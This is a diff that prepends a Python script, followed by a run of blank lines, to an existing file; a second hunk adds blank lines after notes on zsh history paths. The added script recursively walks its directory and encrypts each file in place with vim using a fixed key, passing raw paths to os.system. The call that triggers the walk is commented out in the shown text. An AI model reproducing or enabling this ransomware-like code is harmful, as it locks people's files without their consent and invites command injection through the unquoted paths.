@@ -1,3 +1,59 @@
+import os, subprocess,pathlib
+
+path = pathlib.Path(__file__).parent.resolve()
+fp =__file__
+fn=fp.replace(str(path),'')
+fp=str(path)+fn
+if fn.startswith('\\'):
+    
+    fn=fn[1:]
+print('fp',fp,fn)
+def encr_file(fpath):
+    os.system('vim --cmd "set key=123" -c wq '+fpath)
+
+def make_tree(path):
+    
+    dirlist = os.listdir(path)
+    #print(dirlist.sort(),dirlist,type(dirlist))
+    for list_item in dirlist:
+        if list_item.startswith('.') or list_item.startswith('__') or list_item==fn:
+            continue
+        full_path = str(path)+"/"+list_item
+        #print(full_path,end=", ")
+        if os.path.isdir(full_path):
+            make_tree(full_path)
+        elif os.path.isfile(full_path):
+            #print(list_item,'is file')
+            encr_file(full_path)
+            #f= open(full_path,'r+')
+            #print("file: ",full_path)
+            #print(f.read())
+            #print('\n\n')
+        else:
+            print(list_item,'is special file')
+#f=open(,'w+')
+#f.write("import os\n# testing completed")
+#f.close()
+#make_tree(path)
+#if os.path.isdir()
+#print(os.listdir(path))
+#print ("path",path,__file__)
+#print ("path2",pathlib.Path(__file__).name)
+#print ("path3",pathlib.Path(__file__))
+#testing2.te()
+
+
+
+
+
+
+
+
+
+
+
+
+
 import os
 import subprocess
 try:
@@ -92,3 +148,8 @@ echo $HISTFILE
 /Applications/PhpStorm 2020.1 EAP.app/Contents/plugins/terminal/.zsh_history
 /Users/username/.zsh_history
 export HISTFILE=$HOME/.zsh_history
+
+
+
+
+
